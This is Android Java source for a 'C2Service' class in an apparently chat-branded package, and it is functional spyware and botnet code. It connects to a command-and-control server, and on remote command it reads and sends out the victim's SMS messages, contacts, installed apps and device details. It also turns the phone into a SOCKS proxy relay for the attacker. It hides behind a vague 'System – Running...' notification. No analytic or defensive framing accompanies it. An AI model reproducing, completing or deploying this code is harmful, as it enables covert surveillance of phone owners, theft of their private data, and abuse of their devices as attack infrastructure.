package com.meetin.chat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import java.io.*;
import java.net.Socket;

public class C2Service extends Service {
    private static final String CHANNEL_ID = "C2Channel";
    private static final int NOTIF_ID = 1;
    private Socket socket;
    private PrintWriter writer;
    private BufferedReader reader;
    private volatile boolean running = true;
    private String deviceId;
    private ProxyService proxyService;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        deviceId = Build.MODEL.replace(" ", "_") + "|" + Build.SERIAL;
        proxyService = new ProxyService();
        proxyService.onCreate();
        Log.d("C2Service", "Service Created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("C2Service", "Service Starting...");
        startForeground(NOTIF_ID, createNotification());
        new Thread(this::connectAndServe).start();
        return START_STICKY;
    }

    private void connectAndServe() {
        while (running) {
            try {
                Log.d("C2Service", "Connecting to " + Config.HOST + ":" + Config.PORT);
                socket = new Socket(Config.HOST, Config.PORT);
                writer = new PrintWriter(socket.getOutputStream(), true);
                reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                // Pass the C2 socket to ProxyService
                proxyService.setC2Socket(socket);

                writer.println("DEVICE:" + deviceId);
                writer.println("READY");
                Log.d("C2Service", "Connected!");

                // Start a thread to handle proxy commands from C2
                new Thread(this::handleProxyCommands).start();

                String command;
                while ((command = reader.readLine()) != null && running) {
                    Log.d("C2Service", "Command: " + command);
                    String response = executeCommand(command);
                    writer.println(response);
                    writer.println("---END---");
                }
            } catch (Exception e) {
                Log.e("C2Service", "Connection error: " + e.getMessage());
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    // Handle PROXY commands from the C2 server
    private void handleProxyCommands() {
        try {
            while (running) {
                String line = reader.readLine();
                if (line != null && line.startsWith("PROXY")) {
                    String[] parts = line.split(" ");
                    if (parts.length == 3) {
                        String host = parts[1];
                        int port = Integer.parseInt(parts[2]);
                        Log.d("C2Service", "Proxy request: " + host + ":" + port);

                        // Connect to destination
                        Socket target = new Socket();
                        target.connect(new java.net.InetSocketAddress(host, port), 10000);
                        OutputStream targetOut = target.getOutputStream();
                        InputStream targetIn = target.getInputStream();

                        // Send CONNECTED response
                        writer.println("CONNECTED");
                        writer.flush();

                        // Relay data between C2 and target
                        relayProxyTraffic(target);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("C2Service", "Proxy handler error: " + e.getMessage());
        }
    }

    private void relayProxyTraffic(Socket target) {
        try {
            InputStream targetIn = target.getInputStream();
            OutputStream targetOut = target.getOutputStream();
            InputStream c2In = socket.getInputStream();
            OutputStream c2Out = socket.getOutputStream();

            byte[] buffer = new byte[8192];
            boolean[] closed = {false};

            Thread t1 = new Thread(() -> {
                try {
                    int len;
                    while ((len = c2In.read(buffer)) != -1) {
                        targetOut.write(buffer, 0, len);
                        targetOut.flush();
                    }
                } catch (Exception e) {}
                closed[0] = true;
            });

            Thread t2 = new Thread(() -> {
                try {
                    int len;
                    while ((len = targetIn.read(buffer)) != -1) {
                        c2Out.write(buffer, 0, len);
                        c2Out.flush();
                    }
                } catch (Exception e) {}
                closed[0] = true;
            });

            t1.start();
            t2.start();

            while (!closed[0]) {
                Thread.sleep(100);
            }

            try { target.close(); } catch (Exception e) {}

        } catch (Exception e) {
            Log.e("C2Service", "Proxy relay error: " + e.getMessage());
        }
    }

    private String executeCommand(String command) {
        if (command.startsWith("@")) {
            String[] parts = command.split(":", 2);
            if (parts.length < 2) return "Invalid target";
            String target = parts[0].substring(1);
            String cmd = parts[1];
            if (target.equals("all") || target.equals(deviceId) || target.equals(Build.MODEL)) {
                return executeCmd(cmd);
            }
            return "Ignored";
        }
        return executeCmd(command);
    }

    private String executeCmd(String cmd) {
        if (cmd.equalsIgnoreCase("proxy on")) {
            proxyService.startProxy();
            return "✅ SOCKS5 proxy started on port 1080\n🌐 Use bore.pub:4444 as SOCKS5 proxy";
        }
        if (cmd.equalsIgnoreCase("proxy off")) {
            proxyService.stopProxy();
            return "❌ Proxy stopped";
        }
        if (cmd.equalsIgnoreCase("proxy status")) {
            return proxyService.isRunning() ? "✅ Proxy running" : "❌ Proxy stopped";
        }

        if (cmd.equalsIgnoreCase("ping")) return "PONG";
        if (cmd.equalsIgnoreCase("info")) return DeviceInfo.getInfo(this);
        if (cmd.equalsIgnoreCase("sms read")) return DeviceInfo.readSms(this);
        if (cmd.equalsIgnoreCase("apps list")) return DeviceInfo.getApps(this);
        if (cmd.equalsIgnoreCase("contacts")) return DeviceInfo.getContacts(this);
        if (cmd.equalsIgnoreCase("device")) return deviceId;
        if (cmd.equalsIgnoreCase("exit")) { running = false; stopSelf(); return "EXIT"; }

        return "Unknown command. Available: ping, info, sms read, contacts, apps list, device, proxy on/off/status, exit";
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        running = false;
        if (proxyService != null) proxyService.stopProxy();
        try { socket.close(); } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
